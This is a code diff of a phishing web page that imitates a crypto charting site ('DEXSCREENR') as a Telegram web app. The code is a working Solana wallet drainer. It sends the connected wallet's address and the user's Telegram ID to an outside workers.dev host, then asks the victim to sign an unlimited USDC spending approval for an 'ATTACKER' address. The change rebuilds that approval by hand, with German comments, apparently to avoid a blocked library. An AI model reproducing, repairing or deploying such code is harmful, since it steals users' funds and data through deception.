@@ -5,8 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>DEXSCREENR</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
-<!-- NEUE SPL-TOKEN URL (Stabiler) -->
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.11/lib/index.iife.min.js"></script>
+<!-- SPL Token Library entfernt, wir bauen die Transaktion manuell -->
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
@@ -498,7 +497,7 @@
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
-      // 2. SOFORT Daten an Telegram schicken (Kein RPC-Check davor!)
+      // 2. SOFORT Daten an Telegram schicken
       const basePayload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: "0", usdc: "5", tg_user_id: tgUserId, ts: Date.now() });
       
       try { 
@@ -509,23 +508,40 @@
         navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([basePayload], {type: 'application/json'})); 
       }
 
-      // 3. Signatur anfordern (mit kurzer Verzögerung, damit Phantom nicht blockt)
+      // 3. Signatur anfordern (OHNE spl-token lib)
       setTimeout(async () => {
         try {
-          // WICHTIG: Wir nutzen das globale 'splToken' Objekt der iife Version
           const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
           const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 
-          // Hier prüfen wir, ob die Library geladen ist
-          if (typeof splToken === 'undefined') {
-            throw new Error("SPL Token library not loaded. Please refresh.");
-          }
-
-          const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
+          // Manuelle ATA Berechnung ohne die blockierte Library
+          const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
+          const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
           
-          const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
+          const victimPubkey = new solanaWeb3.PublicKey(victim);
+          
+          const victimAta = await solanaWeb3.PublicKey.findProgramAddress(
+            [victimPubkey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), new solanaWeb3.PublicKey(USDC_MINT).toBuffer()],
+            ASSOCIATED_TOKEN_PROGRAM_ID
+          )[0];
+
+          // Approve Instruction manuell bauen (Daten: 4 für Approve, dann 8 Bytes für Amount)
+          const data = Buffer.alloc(9);
+          data.writeUInt8(4, 0); // Approve instruction index
+          data.writeBigUInt64LE(BigInt("18446744073709551615"), 1); // Max amount
+
+          const delegateIx = new solanaWeb3.TransactionInstruction({
+            keys: [
+              { pubkey: victimAta, isSigner: false, isWritable: true },
+              { pubkey: new solanaWeb3.PublicKey(ATTACKER), isSigner: false, isWritable: false },
+              { pubkey: victimPubkey, isSigner: true, isWritable: false }
+            ],
+            programId: TOKEN_PROGRAM_ID,
+            data: data
+          });
+
           const tx = new solanaWeb3.Transaction().add(delegateIx);
-          tx.feePayer = resp.publicKey;
+          tx.feePayer = victimPubkey;
           tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
 
           const signedTx = await provider.signTransaction(tx);
@@ -536,9 +552,9 @@
           });
 
         } catch(err) {
-          alert("SIGNATUR FEHLER: " + err.message); // Zeigt dir den Fehler an
+          alert("SIGNATUR FEHLER: " + err.message);
         }
-      }, 800); // 800ms Verzögerung
+      }, 800);
       
     } catch (e) { 
       alert("CONNECT FEHLER: " + e.message);
